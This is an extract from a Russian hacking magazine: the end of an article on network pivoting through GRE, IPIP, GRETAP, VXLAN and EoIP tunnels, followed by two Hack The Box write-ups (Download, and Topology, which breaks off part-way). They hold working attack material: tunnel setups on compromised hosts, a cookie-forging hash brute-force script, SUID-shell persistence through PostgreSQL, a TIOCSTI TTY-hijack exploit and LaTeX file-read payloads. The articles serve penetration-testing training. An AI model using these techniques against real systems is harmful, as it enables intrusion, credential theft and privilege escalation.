  Настрой ка на сто роне атакующего (я выбрал Kali Linux) выглядит сле-
дующим образом:


sudo ip link add name gretunnel type gre local 218.123.134.80 remote
128.78.23.45
sudo ip addr add 10.10.10.1/24 dev gretunnel
sudo ip link set dev gretunnel up

Об рати вни мание на адресацию 10.10.10.0/24. Это внутренняя адре сация
в GRE-тун неле, нужная для его корректной работы.
   Те перь нас траиваем пог раничный роутер Cisco:


NightmareBorder# conf t
NightmareBorder(config)# interface tunnel 10
NightmareBorder(config-if)# tunnel source 128.78.23.45
NightmareBorder(config-if)# tunnel destination 218.123.134.80
NightmareBorder(config-if)# ip address 10.10.10.2 255.255.255.0
NightmareBorder(config-if)# no shutdown
NightmareBorder(config-if)# end
NightmareBorder# write mem





        Работоспособность GRE-туннеля, пинг в сторону Cisco IOS

GRE-туннель активен, теперь самое время про писать маршру ты до целевых
сег ментов. Атакующий, оказавшись на пог раничном роуте ре (сценарий пос-
тэксплуатации), может сам изучить таб лицу маршрутизации и узнать, до каких
сег ментов ему писать маршру ты. В лабораторной сети этих сегментов три:


sudo route add -net 10.10.200.0 netmask 255.255.255.0 gw 10.10.10.2
sudo route add -net 10.10.220.0 netmask 255.255.255.0 gw 10.10.10.2
sudo route add -net 10.10.240.0 netmask 255.255.255.0 gw 10.10.10.2

Шлюзом для этих подсетей выступает уда лен ная сторона GRE-туннеля
(10.10.10.2), то есть мы таким образом про писываем маршруты сквозь пог-
раничный роутер, как и предполагалось в сценарии. После нас тройки мар-
шрутов атакующий может взаимо действо вать с этими сегментами и раз-
вивать новые векторы атак.





           Процесс TCP-сканиро вания внутри туннеля GRE

Как мы видим, TCP-сег менты достига ют целевой  сети  10.10.200.0/24,
на скриншоте ты также можешь заметить заголовок GRE, благодаря которому
и работа ет пивотинг.


IPIP (L3)

IPIP (IP in IP) — туннель сетевого уров ня L3, он очень похож на протокол GRE,
но сама инкапсуляция происходит во вто рой IP-заголовок. Такой туннель
прост в эксплуатации и работает в режиме «IP over IP». С помощью IPIP ата-
кующий так же может построить L3-туннель сквозь взломанный хост. В сце-
нарии с IPIP целью будет взломанный сер вер на Debian. Предположим, что
на той же машине есть вто рой интерфейс с адре саци ей 192.168.252.0/24
(Warehouse).





                           Схема сети

Настройка атакующей машины для IPIP выглядит сле дующим образом, здесь
ничего экстраординар ного:


sudo ip link add name ipiptunnel type ipip local 218.123.134.80
remote 128.78.23.45
sudo ip addr add 10.10.10.1/24 dev ipiptunnel
sudo ip link set dev ipiptunnel up

На взломан ном сервере с Debian настрой ка такая же, но наоборот:


sudo ip link add name ipiptunnel type ipip local 128.78.23.45 remote
218.123.134.80
sudo ip addr add 10.10.10.2/24 dev ipiptunnel
sudo ip link set dev ipiptunnel up

Те перь IPIP-тун нель между ата кующим и взломан ным сервером становится
активным и атакующий сможет развивать ата ки на сеть 192.168.252.0/24
(Warehouse):


sudo route add -net 192.168.252.0 netmask 255.255.255.0 gw 10.10.10.2





                 TCP-сканирование внут ри IPIP-туннеля

Как  видно  на  скриншоте,  полезная  нагрузка  при  TCP-сканиро вании
при помощи Nmap была инкапсулирована в IP-заголовок, что доказы вает
характеристику про токо ла IPIP (IP over IP).


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ



         ИСПОЛЬЗУЕМ ПРОВАЙДЕРСКИЕ
          ПРОТОКОЛЫ ДЛЯ ПИВОТИНГА





GRETAP (L2)

GRETAP — это TAP-интерфейс, который работает в режиме GRE. На самом
деле протокол GRE может транспор тировать не толь ко IP-трафик, но и
Ethernet-кадры. В таком случае зна чение Protocol Type будет равно 0x6558.
Так что сейчас речь идет о L2-туннелиро вании. L2-туннели позволяют зло-
умыш ленни ку проводить атаки канального уров ня, использовать Responder,
mitm6 и прочие средства. В нашем сценарии атакующий уже получил доступ
к некой машине на Debian, именно с нее он будет строить L2-туннель
с помощью GRETAP-интерфейсов.
   Этот вектор туннелирования будет развивать ся из ранее созданного сце-
нария с GRE-тун нелем, то есть воз ника ет тун нель в туннеле. Потенциально же
такая ата ка может происхо дить из любой точ ки инфраструк туры, как раз бла-
годаря GRE-инкапсуляции, которая будет транспортировать всю полез ную
наг рузку. Сама ситуация «туннель в туннеле» бывает не всегда, это прос то
при мер из головы.





                       Схема сети с GRETAP

С настройками здесь будет посложнее по сравнению с L3-туннелями. В дело
всту пают bridge (бриджи/мос ты). Это специаль ные логичес кие устройства,
куда помещаются физические интерфей сы. Чтобы обеспечить себя L2-дос-
тупом, атакующий дол жен соз дать мост на взло манной машине, а также
поместить туда ее физичес кий интерфейс и вир туальный TAP-интерфейс,
при чем необ ходимо соб людать порядок команд и исполнить их как одну
с помощью точки с запятой. Конфигурации L2-туннелей не прощают ошибок:
если ты где-то напутал, есть риск потерять дос туп к скомпрометированной
машине, а это очень большой удар для пентестера.
   Начнем  с  настроек  на  стороне  ата кующего.  GRETAP-туннель меж-
ду 10.10.10.1 (Kali) и 10.10.220.3 (целевая машина Debian с рутовым дос-
тупом):


sudo ip link add name thegretap type gretap local 10.10.10.1 remote
10.10.220.3
sudo ip link set dev thegretap up

На сто роне взло манной машины настрой ка происходит в нес колько этапов:
 • соз дание GRETAP-интерфейса и его активация;
 • соз дание бриджа;
 • до бав ление в бридж GRETAP-интерфейса;
 • удаление существующего адреса с интерфейса и его переме щение
   на bridge (это делают, что бы не потерять сетевую связ ность, так как после
   добав ления интерфейса в бридж сам интерфейс подчиня ется бриджу,
   и по-хороше му бы стоит назначить адрес на сам бридж);
 • до бав ление физического интерфейса ОС в бридж;
 • активация работы брид жа;
 • назначение адре са шлю за по умол чанию  (ког да мы удаляли адрес
   из интерфейса — исчезал и маршрут по умолчанию).


sudo ip link add name thegretap type gretap local 10.10.220.3 remote
10.10.10.1
sudo ip link set dev thegretap up


sudo brctl addbr bridge
sudo brctl addir bridge thegretap
sudo ip addr del 10.10.220.3/24 dev eth0; sudo ip addr add 10.10.220.
3/24 dev bridge; sudo brctl addif bridge eth0; sudo ip link set dev
bridge up; sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.220.
254

Те перь на GRETAP-интерфейсе атакующе го пошел движ. Мы видим здесь
при сутствие протокола STP — это уже доказывает, что мы обеспечили себя
именно L2-туннелем, так как STP — протокол каналь ного уровня.





                   Трафик на GRETAP-интерфейсе

Те перь необходимо получить адрес на GRETAP-интерфейс из пространс-
тва 10.10.220.0/24.


sudo dhclient -v tap0; sudo route del default





             Успешно получен ный адрес на TAP-интерфейсе

На этом настройка GRETAP подходит к концу, ата кующий теперь может поз-
волить себе атаки канального уровня.


sudo responder -I thegretap





          Перехваченный NTLMv2-SSP по GRETAP-туннелю

Таким образом можно провес ти L2-пивотинг с помощью GRETAP-интерфей-
сов.


VXLAN (L2)

VXLAN (Virtual EXtensible LAN) — сетевой протокол, поз воляющий стро ить L2-
туннели поверх UDP (UDP/4789). VXLAN-пивотинг тоже может развиваться
из любой точки инфраструктуры, но я повторю ситу ацию «туннель в туннеле»,
где атакующий попал внутрь сети с помощью GRE. Опять же не зацикливай ся
на этом, это просто мой при мер. Мне было удоб нее собирать для тебя прак-
тический мануал, находясь в той же лаборатор ной сети в EVE-NG.
  Машина ата кующе го и ском прометирован ная машина будут VTEP’ами.
VTEP (Virtual Tunnel Endpoint) — устройства, на которых строится и терминиру-
ется туннель VXLAN, они занимаются инкапсуляцией и деинкапсу ляцией
VXLAN-заголов ков.





                        VXLAN-туннелиро вание

Приступим к настройке туннеля меж ду атакующим  (Kali Linux, 10.10.10.1)
и целевой Debian-машиной (10.10.220.2). Также наз начим VNI (это иден-
тификатор VXLAN-туннеля), он будет равен 10. UDP-порт назначения с обеих
сторон одинако вый — 4789. VXLAN может работать в двух режимах: multipoint
и point-to-point, я выберу вто рой вариант.


sudo ip link add name thevxlan type vxlan id 10 local 10.10.10.1
remote 10.10.220.2 dstport 4789
sudo ip link set thevxlan up

На сто роне целевой машины c Debian VXLAN нас траивается так же, однако
при дется снова попотеть над настрой кой бриджа, как это было с GRETAP.


sudo ip link add name thevxlan type vxlan id 10 local 10.10.220.2
remote 10.10.10.1 dstport 4789
sudo ip link set thevxlan up


sudo brctl addbr bridge
sudo brctl addir bridge thevxlan
sudo ip addr del 10.10.220.3/24 dev eth0; sudo ip addr add 10.10.220.
3/24 dev bridge; sudo brctl addif bridge eth0; sudo ip link set dev
bridge up; sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.220.
254

На этом настройка VXLAN с обеих  сто рон  заканчивается, на VXLAN-
интерфейсе атакующего мы видим тра фик про токолов канального уров ня
(STP, CDP), что доказы вает получение именно L2-доступа.





               Трафик на VXLAN-интерфейсе атакующего

Затем получаем адрес на интерфей се VXLAN с последующим удалени ем
шлюза по умолчанию.


sudo dhclient -v tap0; sudo route del default





             Получен ный адрес на VXLAN-интерфейсе

И в этот раз не поб резгую запустить Responder.





           Перех ваченный NTLMv2-SSP по VXLAN-туннелю


EOIP (L2)

EoIP (Ethernet over IP) — это проприетарный протокол MikroTik, позволяющий
строить L2-тун нели поверх интернета, но для этого используется GRE-
инкапсуляция. По фак ту EoIP — это абсо лютно то же самое, что и GRETAP-
интерфейсы в Linux, различия лишь в Proto Type (для EoIP в GRE это значение
0x6400, для GRETAP-туннелей — 0x6558).
  При постэксплуатации RouterOS (имен но  эта сис тема используется
на обо рудовании MikroTik) атакующий может построить L2-туннель меж ду
собой и целевым бриджем с помощью EoIP, одна ко для работы EoIP в дис три-
бути вах Linux нужен модуль eoip. Ата кующему достаточно создать EoIP-
интерфейс в RouterOS, затем поместить его внутрь брид жа (в 90% случаях
в настройках RouterOS используют ся бриджи).
  На сво ей стороне ата кующему достаточно соб рать модуль из репозитория
и запустить интерфейс, при этом создав TAP-интерфейс для корректной
работы мо дуля от katlogic.





                    Сеть с пограничным RouterOS

Ата кующий из интерне та может оказать ся в целевой сети на уровне L2, но это
крайне специфи ческий сце нарий и име ет право на существование только
в момент пос тэксплу ата ции.
  Настрой ки на стороне ата кующего выглядят следующим образом: соз-
дается TAP-интерфейс, запус кается модуль, туннелю зада ется ID 100:


sudo ip tuntap add mode tap tap0
sudo ip link set tap0 up
sudo ./eoip tap0 218.123.134.80 128.78.23.45:100

На стороне RouterOS ана логич но, но при этом нуж но поместить созданный
EoIP-интерфейс в существующий бридж внут ри RouterOS для получе ния L2-
доступа. Тут используется версия RouterOS v6:


/interface eoip add name=thenightmare local-address=128.78.23.45
remote-address=218.123.134.80 tunnel-id= 100
/interface bridge port add interface=thenightmare bridge= LAN

Пос ле этих настроек EoIP-туннель будет уста новлен. На TAP-интерфейсе ата-
кующего уже есть трафик, адрес по DHCP получен.





                Трафик на TAP-интерфей се внутри EoIP





               Отработав ший Responder внутри EoIP

Таким образом можно провес ти сво еобразный пивотинг сквозь RouterOS
и проводить ата ки каналь ного уровня. Вектор край не необычный, однако есть
шанс, что им можно будет воспользоваться в кор поративных сетях.


ÏÈÂÎÒÈÍÃ ÏÐÎÒÈÂ WINDOWS

Как ты заметил, все описанные выше при емы продемонстрированы именно
на Linux. Почему так получилось? Потому что дес ктопные редакции Windows
не поддержи вают протоколы тун нелирования вро де GRE и VXLAN. Воз можно,
их под держка есть в Windows Server, но в эту тему я не углублял ся. Однако
и здесь есть решение, хоть и доволь но экзотическое.
  В июле этого года я сделал «ремикс» статьи «Пингвин-супершпион»
в исполнении s0i37. Мне пришла в голову мысль развернуть виртуальный
маршрутизатор CHR на VirtualBox внут ри самой Windows. Так я провел L2-
пивотинг и  ата ки  канального уров ня  в целевой  сети, используя  хост
с Windows. Метод ско рее эксперимен тальный, но работает. Виртуальный
CHR под держивает протоколы EoIP, VXLAN, IPIP, GRE и другие.





                   Вот как это выг лядело на бумаге


ÂÛÂÎÄÛ

В своем небольшом исследовании я продемонстри ровал несколько техник
пивотинга с исполь зованием провайдерских про токолов. Это концепция
в духе «living oﬀ the land»: я прос то использовал осо бенности сетевых про-
токо лов и добился импакта для ата кующей стороны. При этом я не исполь-
зовал сто ронние пентестерские ути литы. Методы крайне спе цифические, но,
если ты понима ешь всю картину и зна ешь мат часть, у тебя не возникнет
проблем и эти при емы при ведут к успеху.
ВЗЛОМ





В этом райтапе я продемонстрирую технику
TTY hijacking, которая позволяет зах ватить
сес сию терминала суперпользовате ля. Так-
же   про эксплуати руем   path    traversal
для получения доступа к исходно му коду             RalfHacker                                                                                             hackerralf8@gmail.com
приложе ния на Node.js, украдем сес сию
пользовате ля через создание cookie и при-
меним сле пую инъекцию для получе ния
кон фиденциаль ной информации.


Нашей целью будет захват тренировочной машины Download с пло щад ки
Hack The Box. Уро вень ее — слож ный.




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ

Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в файл /etc/hosts:


10.10.11.226 download.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Сканер нашел два открытых порта:
 • 22 — служба OpenSSH 8.2p1;
 • 80 — веб-сервер Nginx 1.18.0.

Заг лянем на сайт.





                        Главная стра ница сай та


ÒÎ×ÊÀ ÂÕÎÄÀ

Изучая сайт, находим форму заг рузки файлов.





                       Страница /les/upload

Прос матри вая этот запрос в Burp History, увидим типичную для приложения
на Node.js форму cookie.





                       Зап рос в Burp History

Авторизуемся на сай те, декоди руем зна чение download_session и про-
верим, что изме нилось.





            Главная стра ница авто ризо ванного пользователя





                       Зап рос в Burp History

У нас появился параметр user, содер жащий имя пользователя и его иден-
тификатор. Так же для проверки я заг рузил файл и увидел, что сообщение
о выполнении дей ствия попада ет в параметр success.





                    Резуль тат загрузки файла





                       Зап рос в Burp History




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ



            ПЕРЕХВАТЫВАЕМ ТЕРМИНАЛ
        СУПЕРПОЛЬЗОВАТЕЛЯ ПРИ АТАКЕ
                           НА ХОСТ





ÒÎ×ÊÀ ÎÏÎÐÛ

Path traversal
Страница /files/download/ отдает нам файл при скачивании. Стоит про-
верить, нет ли здесь уяз вимости обхода катало га. Сде лать это можно, зап-
росив файл package.json, характерный для прог рамм на Node.js. Я исполь-
зую Burp Intruder и словарь с раз ными вариантами указания пути к файлу.





                       Результат перебора

В ито ге получаем содержимое package.json, отку да узнаем, что основной
файл называется app.js, а так же имя пользовате ля — wesley. Теперь тем же
спо собом зап росим файл app.js.





                  Содержимое файла app.js

По лучаем ключ для подписи куки (строка 39), а еще видим использование
SQL-запросов (стро ка 59).


Cookie
Имея ключ, мы можем манипулировать зна чениями куки, создавая и под-
писывая их для любого пользователя. В этом нам поможет ути лита cookie-
monster. Уста новим ее.


npm install --global yarn
git clone https://github.com/DigitalInterruption/cookie-monster
cd cookie-monster
yarn install
yarn link

Сохраним значение куки в файл и поменя ем имя пользователя на wesley.
Затем сгенери руем нуж ные нам значения.


./cookie-monster.js -e -f cookie.txt -k
8929874489719802418902487651347865819634518936754 -n download_session





              Создание cookie для пользователя wesley

Под став ляем сге нери рованные зна чения в зап рос и получаем страницу
нового поль зователя.





                     Страница в Burp Repeater

В окружении поль зователя на сай те ничего не находим, поэтому про дол жим
прос матри вать исходные коды. В уже известном нам файле app.js отмечаем
под клю чаемые модули.





                  Содержимое файла app.js

Первым делом я просмотрел содержимое фай ла routers/auth.js. Наибо-
лее интересен в нем блок кода для получения пользовате ля с помощью фун-
кции findFirst (стро ки 41–44).





                Содержимое файла routers/auth.js

Кро ме параметра име ни пользователя, есть еще и параметр password. Учи-
тывая, что для выборки из базы исполь зует ся findFirst, можно про тес-
тировать инъекцию, основанную на использовании в передаваемых парамет-
рах других опе раторов: contains, startWith и прочих воз вращающих булевы
зна чения. К примеру, следующее значение cookie отобразило фай лы поль-
зователя!


{
    "flashes":{
        "info":[],
        "error":[],
        "success":[""]
    },
    "user":{
        "username":{
            "contains": "WESLEY"
        },
        "password":{
            "startsWith":""
        }
    }
}





                      Зап рос в Burp Repeater

В самих фай лах ничего интересного нет, зато мы можем попытаться подоб-
рать хеш пароля поль зователя.


Àâòîìàòèçàöèÿ
Смысл в том, чтобы поочередно перебирать символы хеша пароля. Как толь-
ко реальный хеш будет начинаться с указан ной пос ледовательности, мы
получим отличный от остальных слу чаев ответ и начнем перебирать сле-
дующий символ хеша.


import subprocess
import json
import requests


passwd = ""
chars = "0123456789abcdef"
tmp_pass = ""


def getCookie(password) :
   data = {"flashes":{"info" :[],"error":[],"success":[""]} ,"user" :{
"username" :{"contains" : "WESLEY"} ,"password" :{"startsWith":password}}
}
   with open("cookie.txt" ,"w") as f:
       f.write(json.dumps( data))
   out = subprocess.check_output(["./cookie-monster/bin/
cookie-monster.js" , "-e" , "-f" , "cookie.txt" , "-k" ,
"8929874489719802418902487651347865819634518936754" , "-n" ,
"download_session"]).decode()
   index1 = out.index("download_session=") + len("download_session=")
   out = out[index1:]
   sess = out[:out.index("\x1b")]
   index2 = out.index("download_session.sig=") + len(
"download_session.sig=")
   out = out[index2:]
   sig = out[:out.index("\x1b")]
   return sess, sig


for i in range( 32) :
   for c in chars:
       tmp_pass = passwd + c
       print("Hash: " + tmp_pass, end='\r')


       sess, sig = getCookie(tmp_pass)
       cookie = {"download_session": sess, "download_session.sig" :
sig}
       r = requests.get('http://download.htb/home/' , cookies=cookie)


       if( len(r.text) != 2174 ) :
           passwd = tmp_pass
           break


print("Hash: " + passwd)





                    Резуль тат работы скрипта

Спустя несколько минут получаем хеш MD5 и рас шифровываем пароль
при помощи сер виса hashes.com.





                      Результат взло ма хеша

С полученными учетными данными авторизуемся по SSH и забира ем флаг
поль зовате ля.





                       Флаг пользователя


ÏÐÎÄÂÈÆÅÍÈÅ

Те перь нам необходимо собрать информацию. Я буду использовать для это-
го скрип ты PEASS.




Что делать после того, как мы получи ли доступ в систему от имени поль-
зователя? Вари антов дальнейшей эксплуата ции и повышения при виле гий
может быть очень мно го, как в Linux, так и в Windows. Чтобы соб рать
информацию и наметить цели, мож но исполь зовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скрип тов, которые проверяют сис-
тему на автомате и выдают подробный отчет о потенциально интерес ных
файлах, про цессах и настрой ках.



Заг рузим на хост скрипт для Linux, дадим пра во на выполнение и запустим
сканиро вание. В выводе будет мно го информа ции, нам нужно отобрать толь-
ко значимую.
  В спис ке процессов отмечаем работа ющий PostgreSQL, об этом говорит
и прослушиваемый порт 5432. Также у пользователя, от име ни которого
работа ет СУБД, есть своя консоль.




                      Список процес сов





                     Прос лушиваемые порты





                     Поль зователи с кон солью

Еще полезно просматривать запус каемые процес сы с помощью pspy64.
Именно это и помог ло мне обна ружить, что в системе работа ет поль-
зовательская служ ба download-site, а также отметить, что в систему залоги-
нен поль зователь postgres.





                         Логи pspy64

Прос матри ваем  файл  службы  /etc/systemd/system/download-site.
service. В перемен ной окружения для запус ка про цесса находим перемен-
ную DATABASE_URL, а в URL — учетные дан ные для под ключения к базе дан-
ных.





             Со держимое файла download-site.service

Под клю чаемся к базе и получаем информацию о пользователях.


psql -h localhost -p 5432 -U download


\d u





               Ин формация о поль зователях СУБД

Наш поль зователь — член груп пы pg_write_server_files, а значит, имеет
право на запись в файлы. Для персистен тнос ти сле дующи ми командами наз-
начим файлу командной обо лочки S-бит:


cp /bin/bash /tmp/psql_bash
chmod 4777 /tmp/psql_bash

В качес тве метода пер систентнос ти запишем данные команды в файлы /var/
lib/postgresql/.bash_profile  и  /var/lib/postgresql/.bashrc.  Так
как выполняется вход от имени пользователя, будут выполнены коман ды
из этих фай лов.


COPY (SELECT CAST ('/bin/bash -c "cp /bin/bash /tmp/psql_bash ;
chmod 4777 /tmp/psql_bash"' AS text)) TO '/var/lib/postgresql/.
bash_profile';
COPY (SELECT CAST ('/bin/bash -c "cp /bin/bash /tmp/psql_bash ;
chmod 4777 /tmp/psql_bash"' AS text)) TO '/var/lib/postgresql/.
bashrc';

Спустя некоторое время проверяем, не появился ли файл /bin/bash
в каталоге /tmp.





                  Содержимое каталога /tmp

У файла выставлен S-бит, а зна чит, мы можем получить сессию от имени
поль зовате ля postgres.





                  Сессия пользователя postgres


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ

TTY hijacking
Увы, этому поль зователю ничего интерес ного не доступно. Тогда вернемся
к спо собу входа через su -l. Здесь можно поп робовать попасть в сессию
поль зовате ля, от име ни которого выполняется команда su. Эта техника
называется TTY  hijacking. Хотя sudo и su в дан ном слу чае меняют UID
исполняемо го процесса на UID пользовате ля без пол номочий, терминал
по-преж нему остается терминалом пользователя root и, как оказалось, дос-
тупен неп ривиле гированному пользователю.
   Те кущий тер минал программы всегда доступен через файл /dev/tty. Мы
можем его открыть от имени пользователя без полномочий, а затем исполь-
зовать сис кол ioctl для подделки пользовательско го ввода. Это позволит
нам вводить коман ды в чужой терминал. Для эксплуатации этой тех ники мож-
но использовать следующий эксплоит:


#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>


int main() {
   int fd = open("/dev/tty", O_RDWR);
   if (fd < 0) {
       perror("open");
       return -1;
   }
   char *x = "exit\n/bin/bash -c 'cp /bin/bash /tmp/root_bash; chmod
4777 /tmp/root_bash'\n";
   while (*x != 0) {
       int ret = ioctl(fd, TIOCSTI, x);
       if (ret == -1) {
           perror("ioctl()");
       }
       x++;
   }
   return 0;
}

Здесь сначала завер шается работа текущей командной оболочки поль-
зователя (exit\n), а затем записывает ся уже зна комая полезная нагрузка.
Пос ле завершения работы командной оболочки поль зователя postgres шелл
поль зовате ля root считывает поддельный пользовательский ввод и выпол-
няет его.
  Компилируем экспло ит и даем права на выполнение для всех.


gcc exploit.c -static -o lpe.bin
chmod 777 /tmp/lpe.bin

Те перь повторим технику выполнения фай ла через bash_profile и bashrc,
пос ле чего проверим, появился ли файл коман дной оболочки, но уже соз-
данный рутом.


COPY (SELECT CAST ('/bin/bash -c /dev/shm/lpe.bin' AS text)) TO '/
var/lib/postgresql/.bash_profile';
COPY (SELECT CAST ('/bin/bash -c /dev/shm/lpe.bin' AS text)) TO '/
var/lib/postgresql/.bashrc';





                  Содержимое каталога /tmp

Ата ка прошла успешно, теперь мы можем перей ти к сессии root и забрать
вто рой флаг.





                           Флаг рута

Машина захвачена!
ВЗЛОМ





В этом райтапе я покажу, как использовать
инъ екцию команд в LaTeX, что бы про читать
фай лы на сервере и получить критичес ки
важ ные данные. Затем повысим привиле-
гии через gnuplot.                                                          RalfHacker                                                                                             hackerralf8@gmail.com

Проходить будем тре нировочную машину Topology с площадки Hack The Box.
Уровень ее — лег кий.




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ

Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.217    topology.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Скрипт нашел всего два открытых порта:
 • 22 — служба OpenSSH 8.2p1;
 • 80 — веб-сервер Apache 2.4.41.

Брутить SSH смысла нет, поэто му сразу переходим к сайту.





                        Главная стра ница сай та


ÒÎ×ÊÀ ÂÕÎÄÀ

На глав ной странице есть ссылка, которая переносит нас на новый домен
latex.topology.htb.





            Ошибка при переходе на latex.topology.htb

Заносим и этот домен в /etc/hosts и обновляем страницу.


10.10.11.217 topology.htb latex.topology.htb





                   Главная страница latex.topology.htb

На странице видим поле ввода, которое при нима ет от пользователя фор мулу
на языке LaTeX. Но к это му вернемся поз же, а сна чала прос канируем другие
под домены при помощи ffuf.




Одно из пер вых действий при тес тировании безопасности веб-приложе-
ния — это сканиро вание методом перебо ра каталогов, чтобы найти скры тую
информацию и недоступные обыч ным посети телям функции. Для этого можно
использовать программы вроде dirsearch и DIRB.
  Я предпочитаю лег кий и очень быс трый ﬀuf. При запус ке указываем сле-
дующие парамет ры:
 • -w — словарь (я использую сло вари из набора SecLists);
 • -t — количество потоков;
 • -u — URL;
 • -H — заголовок HTTP.

Место перебора помеча ется сло вом FUZZ.


Задаем все параметры и получа ем вот такую коман ду:


ffuf -u http://topology.htb/ -w subdomains-dnsscan-10000.txt -t 256
-H 'Host: FUZZ.topology.htb'





          Ре зультат ска нирования поддоменов с помощью ﬀuf

Но в вывод попадают абсолютно все варианты из списка, а значит, нужно
использовать фильтры, к при меру по раз меру страницы. Для этого добавим
параметр -fs, который отсеет все страницы заданного размера.


ffuf -u http://topology.htb/ -w subdomains-dnsscan-10000.txt -t 256
-H 'Host: FUZZ.topology.htb' -fs 6767





          Ре зультат ска нирования поддоменов с помощью ﬀuf

Находим еще два под домена: dev и stats. Поэтому обновляем запись в фай-
ле /etc/hosts и прос матри ваем новые сайты.


10.10.11.217 topology.htb latex.topology.htb dev.topology.htb stats.
topology.htb

На первом нас встречает HTTP-аутентификация, а на втором прос то отоб-
ражается картинка.





                 Главная страница сай та dev.topology.htb





                Главная стра ница сайта stats.topology.htb

Больше ничего не получив, возвращаемся к форме LaTeX.


ÒÎ×ÊÀ ÎÏÎÐÛ

LaTeX позволяет авто матизировать мно гие задачи при под готовке науч ных
пуб ликаций и самых разных пособий. Он облегчает нумерацию раз делов,
ввод формул, добав ление перекрес тных ссылок и многие дру гие вещи.
Готовя свой документ, автор ука зывает логичес кую структуру текста, а LaTeX
решает вопросы его отображения. То есть содержание отделено от офор-
мле ния.
  Мы же можем исполь зовать слу жебные конс трук ции LaTeX в наших целях,
а именно попробовать выполнить команды на  удаленном  хосте либо
попытать ся про читать локальные фай лы в системе. Первым делом отправим
прос тейшую нагрузку для чтения файла /etc/passwd.


\input{/etc/passwd}





                        Ответ сервера

Как оказалось, не все нагрузки выпол няются на сервере, и мы получаем
сообщение о том, что наша инъ екция обнаружена. Добиться выпол нения
команд не выш ло, а вот найти наг рузку для чтения файлов мне удалось. Сле-
дующий код поз волит прочитать первую строку из файла /etc/passwd.


\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file





                    Строка из файла /etc/passwd

Итак, мы узнали, что на сер вере есть филь тр, а у нас есть возможность его
обходить. Идем дальше и используем дру гую наг рузку для чтения всего фай-
ла.


$\lstinputlisting{/etc/passwd}$





                Со держимое файла /etc/passwd

Таким образом мы получаем воз можность читать локальные фай лы на сер-
вере.


×òåíèå ïðîèçâîëüíîãî ôàéëà
Что пер вым делом смотреть на сер вере? Нас в первую очередь интересу ют
файлы, содер жимое которых может раскрыть нам важную информацию
для прод вижения. Это могут быть какие-то учетные дан ные, нас трой ки и даже
исходники сай тов.
  Помнишь сайт dev, зак рытый HTTP-аутентифика цией? В его каталоге
на сер вере навер няка най дется файл .htpasswd, содержащий имя поль-
зователя и хеш его пароля в формате Apache MD5. Ведь именно их зап-
рашивает сервер, отображая окош ко HTTP-аутентификации. Давай получим
эти учетные данные:


$\lstinputlisting{/var/www/dev/.htpasswd}$





                 Содержимое файла .htpasswd

Ис поль зуем справку hashcat, чтобы узнать режим перебора хеша.


hashcat --example | grep -A5 -B5 '$apr1'





                         Справка hashcat

По лучаем режим 1600, который и указываем при переборе в парамет ре -m.


hashcat -m 1600 -a 0 hash.txt rockyou.txt





                    Результат перебора хеша

С полученными учетными данными мы можем пос мотреть сайт.





                 Главная страница сай та dev.topology.htb

На сай те ничего не находим и пробуем с теми же учетными данными авто-
ризовать ся по SSH. Получи лось! Забираем первый флаг.





                       Флаг пользователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ

Те перь нам необходимо собрать информацию. Я буду использовать для это-
го скрип ты PEASS.




Что делать после того, как мы получи ли доступ в систему от имени поль-
зователя? Вари антов дальнейшей эксплуата ции и повышения при виле гий
может быть очень мно го, как в Linux, так и в Windows. Чтобы соб рать
информацию и наметить цели, мож но исполь зовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скрип тов, которые проверяют сис-
тему на автомате и выдают подробный отчет о потенциально интерес ных
файлах, про цессах и настрой ках.



Заг ружаем на хост скрипт для Linux, даем право на выпол нение и запускаем
сканиро вание. В выводе будет мно го информа ции, давай пос мотрим, что
именно может помочь нам повысить привилегии.
  Сре ди файлов, дос тупных  для  записи,  есть  каталог /opt/gnuplot.
Это единственный проект в каталоге /opt.





                 Фай лы, дос тупные для записи

